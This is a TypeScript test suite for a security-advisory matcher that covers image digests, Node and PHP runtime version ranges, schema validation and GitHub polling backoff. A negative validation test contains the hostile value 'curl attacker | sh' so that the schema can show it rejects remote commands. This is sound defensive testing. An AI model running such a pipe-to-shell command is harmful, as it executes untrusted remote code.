import publishedAdvisories from "../../../security-advisories.json";
import { describe, expect, it } from "vitest";
import {
  SecurityManifestSchema,
  matchSecurityAdvisories,
  securityImageIdentity,
} from "../src/updates/security";
import { updatePollInterval, updateRetryAt } from "../src/updates/poll-policy";

const old = `sha256:${"a".repeat(64)}`,
  fixed = `sha256:${"b".repeat(64)}`;
const manifest = SecurityManifestSchema.parse({
  format: 1,
  revision: 1,
  issuedAt: "2026-10-24T00:00:00Z",
  expiresAt: "2026-10-25T00:00:00Z",
  advisories: [
    {
      id: "test",
      revision: 1,
      title: "Patch runtime",
      message: "Refresh this image",
      severity: "critical",
      url: "https://example.com/advisory",
      publishedAt: "2026-10-24T00:00:00Z",
      action: "refresh-images",
      targets: [
        {
          kind: "image",
          repository: "docker.io/library/node",
          affectedDigests: [old],
          affectedTags: ["22"],
          fixedDigests: [fixed],
        },
        {
          kind: "runtime",
          runtime: "node",
          affected: "<22.23.4 || >=24 <24.22.1",
          fixed: ">=22.23.4 <23 || >=24.22.1",
        },
      ],
    },
  ],
});
const image = {
  ref: "node:22",
  digest: old,
  role: "image" as const,
  serviceId: "s1",
  serviceName: "API",
};

describe("declarative security advisories", () => {
  it("normalizes Docker Hub aliases without treating a host port as a tag", () => {
    expect(securityImageIdentity("node:22")?.repository).toBe("docker.io/library/node");
    expect(securityImageIdentity("registry-1.docker.io/library/node:22")?.repository).toBe(
      "docker.io/library/node",
    );
    expect(securityImageIdentity("registry.example:5000/team/app:stable")).toEqual({
      repository: "registry.example:5000/team/app",
      tag: "stable",
    });
  });
  it("matches immutable evidence and does not confuse another repository", () => {
    expect(matchSecurityAdvisories(manifest, [image], [])[0]?.confidence).toBe("confirmed");
    expect(matchSecurityAdvisories(manifest, [{ ...image, ref: "attacker/node:22" }], [])).toEqual(
      [],
    );
    expect(matchSecurityAdvisories(manifest, [{ ...image, digest: fixed }], [])).toEqual([]);
  });
  it("does not declare a tag safe after it moves to an unverified digest", () => {
    expect(matchSecurityAdvisories(manifest, [{ ...image, digest: null }], [])[0]?.confidence).toBe(
      "possible",
    );
    expect(
      matchSecurityAdvisories(manifest, [{ ...image, digest: `sha256:${"c".repeat(64)}` }], [])[0]
        ?.confidence,
    ).toBe("possible");
  });
  it("uses observed runtime versions and keeps missing/invalid evidence unknown", () => {
    expect(
      matchSecurityAdvisories(
        manifest,
        [],
        [{ runtime: "node", serviceId: "s1", version: "22.23.3" }],
      ),
    ).toHaveLength(1);
    expect(
      matchSecurityAdvisories(
        manifest,
        [],
        [{ runtime: "node", serviceId: "s1", version: "22.23.4" }],
      ),
    ).toEqual([]);
    expect(
      matchSecurityAdvisories(
        manifest,
        [],
        [{ runtime: "node", serviceId: "s1", version: "garbage" }],
      ),
    ).toEqual([]);
  });
  it("rejects remote commands, invalid ranges, credential URLs and duplicate ids", () => {
    const notice = manifest.advisories[0]!;
    for (const bad of [
      { ...notice, command: "curl attacker | sh" },
      { ...notice, action: "refresh-images", targets: [{ kind: "runtime", runtime: "php", affected: "<=8.4.27", fixed: null }] },
      { ...notice, url: "https://user:secret@example.com" },
      {
        ...notice,
        targets: [{ kind: "runtime", runtime: "node", affected: "garbage", fixed: ">=22" }],
      },
    ]) {
      expect(SecurityManifestSchema.safeParse({ ...manifest, advisories: [bad] }).success).toBe(
        false,
      );
    }
    expect(
      SecurityManifestSchema.safeParse({ ...manifest, advisories: [notice, notice] }).success,
    ).toBe(false);
  });
});
describe("GitHub polling budget", () => {
  it("uses five minutes with a credential and an hour anonymously", () => {
    expect(updatePollInterval(true)).toBe(300_000);
    expect(updatePollInterval(false)).toBe(3_600_000);
  });
  it("honors Retry-After and the primary quota reset instead of retrying immediately", () => {
    const now = Date.now();
    expect(updateRetryAt(new Headers({ "retry-after": "7200" }), now, 1)).toBe(now + 7_200_000);
    expect(
      updateRetryAt(
        new Headers({
          "x-ratelimit-remaining": "0",
          "x-ratelimit-reset": String(Math.ceil(now / 1000) + 3600),
        }),
        now,
        1,
      ),
    ).toBeGreaterThanOrEqual(now + 3_600_000);
  });
});

describe("published October runtime guidance", () => {
  const feed = SecurityManifestSchema.parse({
    format: 1,
    revision: 1,
    issuedAt: "2026-10-24T00:00:00.000Z",
    expiresAt: "2026-10-25T00:00:00.000Z",
    ...publishedAdvisories,
  });
  it.each([
    ["8.2.34", "8.2.35"],
    ["8.3.35", "8.3.36"],
    ["8.4.26", "8.4.27"],
    ["8.5.11", "8.5.12"],
  ])("detects PHP %s and clears only the version patch at %s", (old, fixed) => {
    const matches = (version: string) =>
      matchSecurityAdvisories(feed, [], [{ runtime: "php", serviceId: "php", version }]);
    expect(matches(old).map((m) => m.advisory.id)).toContain("PHP-2026-10-21-rce");
    const patched = matches(fixed);
    expect(patched.map((m) => m.advisory.id)).not.toContain("PHP-2026-10-21-rce");
    expect(patched).toEqual([
      expect.objectContaining({
        advisory: expect.objectContaining({
          id: "CVE-2026-115560-php-review",
          action: "manual",
        }),
      }),
    ]);
  });
  it.each([
    ["22.23.3", "22.23.4"],
    ["24.22.0", "24.22.1"],
    ["26.12.0", "26.12.1"],
  ])("detects Node %s and clears it at %s", (old, fixed) => {
    const matches = (version: string) =>
      matchSecurityAdvisories(feed, [], [{ runtime: "node", serviceId: "node", version }]);
    expect(matches(old).map((m) => m.advisory.id)).toEqual(["CVE-2026-111497-node"]);
    expect(matches(fixed)).toEqual([]);
  });
});
